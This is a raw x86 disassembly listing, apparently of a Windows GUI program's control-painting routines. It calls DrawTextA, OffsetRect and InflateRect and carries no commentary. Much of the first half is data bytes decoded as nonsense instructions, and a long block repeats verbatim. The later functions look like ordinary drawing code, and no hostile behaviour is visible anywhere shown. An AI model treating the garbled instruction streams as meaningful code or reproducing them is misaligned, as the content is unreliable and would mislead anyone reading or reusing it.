sub eax 0x6e4f0900
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ edi + 0x6e ] ecx
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090032 ] al
outsb
daa
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
inc eax
add al ch
xor [ eax ] eax
enter 0x4140 0x0
enter 0x413e 0x0
add [ ebx + 0x41 ] al
jb r-xdata
add al bh
inc ecx
inc ecx
add [ eax ] al
add [ eax ] al
add ah al
aad 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edx * 8 + 0x140042 ] ch
push ebp
jo r-xdata
push ebx
je r-xdata
arpl [ ebx - 0x5c ] bp
sub [ ebx ] eax
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al 0x0
or ecx [ edi + 0x6e ]
inc esp
outsd
ja r-xdata
add [ eax - 0x15 ] bh
inc edx
add [ ebp + eax * 2 - 0x153fffbf ] al
inc edx
add ah bl
0x45e40042 0x41
inc esp
jb r-xdata
dec ebp
outsd
jne r-xdata
sub eax [ ebx ]
add [ ecx ] al
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
inc ebx
add al bl
add [ eax ] al
shl [ edi ] 0x1
inc eax
inc ecx
add al cl
inc ecx
add [ eax ] al
inc ebx
inc ecx
add al cl
nop
add [ eax ] al
sbb [ edx + eax * 2 + 0x40346400 ] bh
add [ eax + 0x34 ] dh
inc eax
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
aad 0x42
add [ eax + eax ] dl
jb r-xdata
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0xffffffffc843155a
xor al 0x40
inc esp
outsd
sub_42d0d2
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
push cs
push eax
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
outsb
je r-xdata
add [ eax - 0x80000000 ] al
pop ds
add [ eax ] cl
push ebx
push 0x6948776f
outsb
je r-xdata
outsb
je r-xdata
add [ eax ] al
add [ ebx ] bl
add [ ebx ] cl
push eax
popad
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
[ esi * 2 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb al [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
or dl [ eax + 0x61 ]
and eax 0xdcdc0043
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
jo r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ ecx ] cl
push eax
outsb
je r-xdata
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x61500e00
outsb
je r-xdata
js r-xdata
jo r-xdata
adc [ eax ] al
0xccff0000 0x4374
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
push cs
push eax
popad
je r-xdata
outsb
je r-xdata
jb r-xdata
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
add [ eax ] al
and [ 0x6e4f0e00 ] 0x43
outsd
outsb
je r-xdata
inc ebx
add ah dl
xchg ebx eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
or [ edx ] eax
add bh bh
mov al 0xc
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
push [ ebp + ebx * 8 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
outsd
sbb al 0x0
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
test [ ebx + eax * 2 ] dh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
fadd [ ebx ]
pop esp
fld [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
and [ eax ] al
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
push 0x6948776f
outsb
je r-xdata
jb r-xdata
adc [ eax ] al
test eax 0xb0ff0001
fadd [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb eax [ eax ]
or edx [ eax + 0x61 ]
add [ eax ] al
js r-xdata
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
push edi
adc [ eax ] al
push edi
add [ eax ] al
adc [ eax ] al
cdq
add [ eax ] al
[ eax + 0x70004374 ]
jb r-xdata
push edi
jb r-xdata
add [ eax ] al
sbb [ edi ] 0x0
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
inc esp
add [ eax + eax ] bh
call [ eax ]
jae r-xdata
add [ eax ] al
dec edi
jbe r-xdata
in al dx
push eax
outsd
jo r-xdata
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc esp
jb r-xdata
jo r-xdata
adc [ eax ] al
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
inc ebx
imul ebp [ esi + 0x74 ] r-xdata
fcomp st4
add [ ebp + ebx * 8 + 0x43 ] bl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001e ] al
jns r-xdata
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
dec ebx
jns r-xdata
add [ eax + 0x4f07002b ] al
push esp
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x14 ] bp
sub [ ebx ] eax
sbb [ ecx ] al
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
jo r-xdata
cmovno eax [ eax ]
rol [ ecx ] 0x0
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe941d2d4
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : edx ] cl
dec edi
outsb
cmovno eax [ eax ]
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
hlt
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or ecx [ edi + 0x6e ]
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : edx ] cl
dec edi
cmovno eax [ eax ]
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
push es
dec edi
outsb
inc ebp
js r-xdata
inc esp
jb r-xdata
add [ eax - 0x80000000 ] al
sub [ eax ] al
or cl [ edi + 0x6e ]
sub [ ebx ] eax
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ eax + 0x4f0a0028 ] al
outsb
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
cmovno eax [ eax ]
sub [ ecx ] al
add bh bh
sub [ ecx ] al
[ eax ]
sub [ ebx ] al
[ eax ] al
push eax
add [ eax ] al
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
jns r-xdata
je r-xdata
loopne r-xdata
jo r-xdata
daa
sub [ eax ] 0x43
add al ah
add [ eax ] eax
jmp eax
dec edi
outsb
pop eax
daa
inc ebx
add al ah
add [ eax ] al
jmp eax
xor al 0x28
inc ebx
add al ch
add [ eax ] eax
outsb
dec ebx
jns r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a002e ] al
sub [ ebx ] al
fadd [ ecx ]
add bh bh
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0900
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ edi + 0x6e ] ecx
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090032 ] al
outsb
daa
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
inc eax
add al ch
xor [ eax ] eax
enter 0x4140 0x0
enter 0x413e 0x0
add [ ebx + 0x41 ] al
jb r-xdata
add al bh
inc ecx
inc ecx
add [ eax ] al
add [ eax ] al
add ah al
aad 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edx * 8 + 0x140042 ] ch
push ebp
jo r-xdata
push ebx
je r-xdata
arpl [ ebx - 0x5c ] bp
sub [ ebx ] eax
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al 0x0
or ecx [ edi + 0x6e ]
inc esp
outsd
ja r-xdata
add [ eax - 0x15 ] bh
inc edx
add [ ebp + eax * 2 - 0x153fffbf ] al
inc edx
add ah bl
0x45e40042 0x41
inc esp
jb r-xdata
dec ebp
outsd
jne r-xdata
sub eax [ ebx ]
add [ ecx ] al
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
inc ebx
add al bl
add [ eax ] al
shl [ edi ] 0x1
inc eax
inc ecx
add al cl
inc ecx
add [ eax ] al
inc ebx
inc ecx
add al cl
nop
add [ eax ] al
sbb [ edx + eax * 2 + 0x40346400 ] bh
add [ eax + 0x34 ] dh
inc eax
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
aad 0x42
add [ eax + eax ] dl
jb r-xdata
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0xffffffffc843155a
xor al 0x40
inc esp
outsd
sub_42d54c
or [ edx + 0x41 ] 0x0
push esp
jmp r-xdata
dec eax
inc ecx
add [ ecx + ecx * 2 ] ah
inc ecx
add al dl
dec ecx
inc ecx
add [ eax + 0x4b ] ch
inc ecx
add al al
dec ebx
inc ecx
add [ esp + ecx * 2 + 0x41 ] dl
add [ eax ] dl
push esp
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc edx
add [ ecx - 0x4645afba ] cl
add [ eax ] al
add [ ebx - 0x6b06173a ] cl
add [ eax ] al
mov edx 0x69
mov eax esi
call sub_436b38
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
je r-xdata
imul ebp [ esi + 0x67 ] r-xdata
sub_42d5ec
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43f7a4
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_436b14
mov edx 0x69
mov eax esi
call sub_436b38
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_42d648
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_439bac
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
call sub_41d0dc
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_41d038
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
sub_42d6b4
push ebp
mov ebp esp
mov ecx 0x11
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x208 ]
mov edx [ ebx + 0x68 ]
mov eax edi
call sub_41d0dc
call sub_42a64c
call sub_42a72c
test al al
je r-xdata
mov edx r-xdata
mov eax edi
call sub_41d038
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x1d ]
push eax
mov edx [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
lea edx [ ebp - 0x50 ]
mov eax ebx
call sub_437358
cmp [ ebp - 0x50 ] 0x0
je r-xdata
dec edx
mov ecx [ ebx + 0x48 ]
xor eax eax
call sub_41240c
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
adc edx 0x0
push 0x0
lea eax [ ebp - 0x2d ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_41240c
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x54 ]
mov eax ebx
call sub_437358
mov eax [ ebp - 0x54 ]
call sub_40422c
push eax
lea edx [ ebp - 0x58 ]
mov eax ebx
call sub_437358
mov eax [ ebp - 0x58 ]
call sub_40442c
push eax
mov eax edi
call sub_41d1bc
push eax
call GetTextExtentPoint32A
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
mov ecx [ ebp - 0xc ]
xor edx edx
xor eax eax
call sub_41240c
mov eax ebx
mov si 0xffc8
call sub_403430
test al al
jne r-xdata
mov edx 0xff000006
mov eax [ edi + 0x14 ]
call sub_41ca04
inc [ ebp - 0x1d ]
inc [ ebp - 0x19 ]
mov edx 0xff000014
mov eax [ edi + 0x14 ]
call sub_41ca04
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_41cde4
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x1d ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ edi + 0x14 ]
call sub_41ca04
jmp r-xdata
mov [ ebp - 0x39 ] eax
mov eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x25 ]
push eax
mov eax [ ebp - 0x29 ]
push eax
mov eax [ ebp - 0x2d ]
push eax
mov eax edi
call sub_41d1bc
push eax
call ExcludeClipRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x8
sub eax [ ebp - 0x25 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
push 0x0
push 0x8
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42da5d
lea eax [ ebp - 0x8c ]
mov edx 0x5
call sub_403f90
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_403f90
lea eax [ ebp - 0x60 ]
call sub_40464c
lea eax [ ebp - 0x5c ]
mov edx 0x4
call sub_403f90
retn
mov eax ebx
mov si 0xffc8
call sub_403430
test al al
jne r-xdata
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_41cde4
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_437358
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1c
mov [ ebp - 0xd ] 0x1b
jmp r-xdata
lea edx [ ebp - 0x3d ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x21 ]
sub eax [ ebp - 0x29 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_437358
mov edx [ ebp - 0x7c ]
mov eax [ ebx + 0x208 ]
call sub_41d01c
push eax
mov eax [ ebp - 0x15 ]
pop edx
sub eax edx
sub eax 0x8
xor ecx ecx
xor edx edx
call sub_41240c
push edi
lea esi [ ebp - 0x78 ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x1d ]
push eax
xor ecx ecx
xor edx edx
mov eax 0x8
call sub_41240c
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax ebx
call sub_437358
mov edx [ ebp - 0x64 ]
lea eax [ ebp - 0x60 ]
call sub_404798
mov eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
push 0x0
push 0x0
mov eax edi
call sub_41d1bc
push eax
call sub_42a64c
lea ecx [ ebp - 0x4c ]
pop edx
call sub_42a894
jmp r-xdata
call sub_42a64c
lea ecx [ ebp - 0x4c ]
mov dl [ ebp - 0xd ]
call sub_42a8f8
lea eax [ ebp - 0x3d ]
push eax
push 0x0
mov eax edi
call sub_41d1bc
push eax
call sub_42a64c
lea ecx [ ebp - 0x4c ]
pop edx
call sub_42a7e8
push 0x0
mov eax edi
call sub_41d1bc
push eax
call SelectClipRgn
lea edx [ ebp - 0x5c ]
mov eax ebx
call sub_437358
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov edx 0x20
mov eax ebx
call sub_439638
mov esi eax
mov eax esi
or eax 0x400
push eax
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_437358
mov eax [ ebp - 0x80 ]
call sub_40422c
push eax
lea edx [ ebp - 0x84 ]
mov eax ebx
call sub_437358
mov eax [ ebp - 0x84 ]
call sub_40442c
push eax
mov eax edi
call sub_41d1bc
push eax
call DrawTextA
mov edx [ ebx + 0x70 ]
mov eax [ edi + 0x14 ]
call sub_41ca04
push esi
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x88 ]
mov eax ebx
call sub_437358
mov eax [ ebp - 0x88 ]
call sub_40422c
push eax
lea edx [ ebp - 0x8c ]
mov eax ebx
call sub_437358
mov eax [ ebp - 0x8c ]
call sub_40442c
push eax
mov eax edi
call sub_41d1bc
push eax
call DrawTextA
sub_42da67
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_437358
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_44e044
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_43cfc4
mov eax ebx
mov si 0xffb8
call sub_403430
test al al
je r-xdata
mov eax ebx
call sub_43e0a0
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dae9
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_42db34
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43ed68
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_436b14
mov edx 0x11
mov eax esi
call sub_436b38
mov [ esi + 0x16d ] 0x1
mov [ esi + 0x170 ] 0x1
call sub_42a64c
call sub_42a72c
test al al
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
sub_42dbe0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test esi 0x400
je r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_439638
mov esi eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_41d0dc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
or esi 0x800
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404234
cmp [ ebx + 0x170 ] 0x0
je r-xdata
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_40422c
push eax
mov eax [ ebp - 0x4 ]
call sub_40442c
push eax
mov eax [ ebx + 0x160 ]
call sub_41d1bc
push eax
call DrawTextA
push 0x1
push 0x1
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41c238
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_40422c
push eax
mov eax [ ebp - 0x4 ]
call sub_40442c
push eax
mov eax [ ebx + 0x160 ]
call sub_41d1bc
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_41c238
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_40422c
push eax
mov eax [ ebp - 0x4 ]
call sub_40442c
push eax
mov eax [ ebx + 0x160 ]
call sub_41d1bc
push eax
call DrawTextA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dd3d
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
sub_42dd47
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffd0
mov ebx eax
mov esi [ ebx + 0x160 ]
mov eax ebx
call sub_42df54
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_41cb20
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
mov al [ ebx + 0x16f ]
mov di [ eax * 2 + rw-data ]
or di 0x40
xor eax eax
mov al [ ebx + 0x16c ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x16e ] 0x0
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_41ca04
xor edx edx
mov eax [ esi + 0x14 ]
call sub_41cb20
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x20 ]
mov eax esi
call sub_41cda8
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc6
call sub_403430
add esp 0x30
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc6
call sub_403430
cmp [ ebx + 0x16e ] 0x2
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_42de68
push ebx
push esi
push edi
add esp 0xffffffec
mov edi eax
test [ edi + 0x1c ] 0x2
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x16d ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov ebx eax
mov edx ebx
mov eax [ edi + 0x160 ]
call sub_41d23c
xor eax eax
mov al [ edi + 0x16f ]
mov cx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ esp + 0x1 ]
mov eax edi
mov si 0xffc6
call sub_403430
xor edx edx
mov eax [ edi + 0x160 ]
call sub_41d23c
push ebx
push 0x0
call ReleaseDC
mov ebx [ edi + 0x40 ]
mov al [ edi + 0x16c ]
mov [ esp ] al
mov eax edi
mov si 0xffc8
call sub_403430
test al al
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax esp
call sub_434138
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ edi + 0x48 ]
sub eax [ esp + 0x9 ]
add ebx eax
sub_42df90
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_42df54
cmp bl al
je r-xdata
mov [ esi + 0x188 ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42dff0
push esi
push edi
mov edi eax
cmp dl [ edi + 0x16f ]
je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x16f ] dl
mov eax edi
mov si 0xffc7
call sub_403430
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42e018
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_436828
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x168 ]
jne r-xdata
xor eax eax
mov [ edi + 0x168 ] eax
sub_42e07c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e110
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_437358
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_44e044
test al al
je r-xdata
mov ebx [ ebx + 0x168 ]
mov eax ebx
mov si 0xffb8
call sub_403430
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_42e160
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43986c
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax esi
call sub_436b14
mov edx 0x19
